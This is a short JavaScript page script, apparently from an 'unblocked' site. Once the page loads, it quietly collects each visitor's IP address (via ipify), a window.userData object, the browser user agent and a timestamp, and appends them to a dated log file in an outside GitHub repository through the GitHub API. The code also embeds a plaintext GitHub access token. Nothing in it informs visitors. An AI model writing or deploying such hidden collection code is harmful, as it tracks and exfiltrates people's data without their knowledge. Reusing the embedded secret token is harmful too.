async function data() {
	const { ip } = await $.getJSON("https://api.ipify.org?format=json");
	const date = new Date().toLocaleString("en-US", { timeZone: "EST" });
	const device = window.navigator.userAgent;
	console.log(
		`User Data: ${JSON.stringify(
			window.userData
		)},\nIP Address: ${ip},\nDate & Time: ${date},\nDevice: ${device}`
	);
	const newDate = new Date();
	const dateShort =
		newDate.getMonth() +
		1 +
		"-" +
		newDate.getDate() +
		"-" +
		newDate.getFullYear();

	let data = await fetch(
		`https://api.github.com/repos/TheUnblockedLabs/important/contents/${dateShort}.txt`
	).then((res) => res.json());
	if (data.message === "Not Found") {
		await fetch(
			`https://api.github.com/repos/TheUnblockedLabs/important/contents/${dateShort}.txt`,
			{
				method: "PUT",
				body: JSON.stringify({
					message: "Updated Logs",
					content: btoa(
						JSON.stringify({
							userData: window.userData,
							ip: ip,
							date: date,
							device: device,
						})
					),
				}),
				headers: {
					Authorization: `token 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`,
				},
			}
		);

		return;
	}

	await fetch(
		`https://api.github.com/repos/TheUnblockedLabs/important/contents/${dateShort}.txt`,
		{
			method: "PUT",
			body: JSON.stringify({
				message: `Updated Logs`,
				sha: data.sha,
				content: btoa(
					JSON.stringify({
						userData: window.userData,
						ip: ip,
						date: date,
						device: device,
					}) +
						"\n\n\n" +
						atob(data.content)
				),
			}),
			headers: {
				Authorization: `token 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`,
			},
		}
	);
}

var checkExist = setInterval(function () {
	if ($("#mainExists").length) {
		data();
		clearInterval(checkExist);
	}
}, 100);
